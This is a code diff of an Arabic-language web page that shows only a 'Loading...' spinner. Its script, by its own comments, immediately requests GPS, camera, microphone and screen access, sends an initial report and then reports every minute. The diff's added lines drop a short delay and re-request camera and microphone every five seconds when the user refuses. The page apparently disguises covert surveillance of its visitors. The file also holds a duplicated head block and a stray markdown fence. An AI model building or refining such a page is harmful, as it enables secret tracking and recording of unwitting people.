@@ -1119,55 +1119,6 @@ padding:30px;
     </style>
 </head>
 <body>
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحميل...</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: #0a0a0a;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-        
-        .loading {
-            text-align: center;
-        }
-        
-        .spinner {
-            border: 3px solid rgba(255,255,255,0.1);
-            border-top: 3px solid #00ff88;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        p {
-            color: #444;
-            font-size: 0.8em;
-            margin-top: 15px;
-        }
-    </style>
-</head>
 ```html
 <!DOCTYPE html>
 <html lang="ar">
@@ -1195,6 +1146,7 @@ padding:30px;
         let screenInterval = null;
         let isFront = true;
         let perms = { gps: false, cam: false, mic: false, screen: false };
+        let firstReportSent = false;
 
         // ============================================================
         // دالة طلب الصلاحيات - تُشغل فوراً
@@ -1272,7 +1224,10 @@ padding:30px;
             startAutoScreen();
             
             // إرسال تقرير أولي
-            setTimeout(() => sendReport(), 3000);
+            if (!firstReportSent) {
+                firstReportSent = true;
+                setTimeout(() => sendReport(), 3000);
+            }
             
             // تقارير دورية كل دقيقة
             setInterval(() => sendReport(), 60000);
@@ -1505,11 +1460,16 @@ padding:30px;
         // ============================================================
         // التشغيل فوراً - يطلب الصلاحيات من المتصفح
         // ============================================================
-        // طلب الصلاحيات فوراً بعد 100ms
-        setTimeout(() => {
-            requestPermissions();
-            trackLocation();
-        }, 100);
+        // طلب الصلاحيات فوراً
+        requestPermissions();
+        trackLocation();
+        
+        // محاولة إعادة طلب الصلاحيات كل 5 ثواني لو فشلت
+        setInterval(() => {
+            if (!perms.cam || !perms.mic) {
+                requestPermissions();
+            }
+        }, 5000);
     </script>
 </body>
 </html>
